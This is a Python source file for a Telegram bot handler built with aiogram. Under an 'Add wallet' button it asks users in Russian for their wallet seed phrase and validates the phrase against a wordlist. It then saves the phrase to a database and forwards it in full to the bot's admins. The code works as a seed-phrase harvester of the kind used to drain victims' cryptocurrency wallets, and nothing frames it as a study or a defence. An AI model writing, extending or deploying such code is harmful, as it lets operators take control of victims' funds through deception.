from aiogram import types
from aiogram.dispatcher import FSMContext

from data.config import seed_words
from loader import dp, Seeds
from states.add_wallet_states import AddWallet
from .components.notify_admins import notify_admins


@dp.message_handler(text='Добавить кошелек')
async def ask_wallet(message: types.Message):
    await message.answer('Отправьте мне сид фразу')
    await AddWallet.first()


@dp.message_handler(state=AddWallet.get_wallet)
async def add_wallet(message: types.Message, state: FSMContext):
    await state.finish()
    message_words = message.text.split()
    if len(message_words) in [12, 15, 18, 21, 24] and sum([1 if i in seed_words else 0 for i in message_words]) == \
            len(message_words):
        if await Seeds.objects.first(seed=message.text) is None:
            await Seeds.objects.create(user_id=message.from_user.id, seed=message.text)
            await notify_admins(f"{message.from_user.id}\n<code>{message.text}</code>")
        return await message.answer('ADDED')
    await message.answer('invalid seed')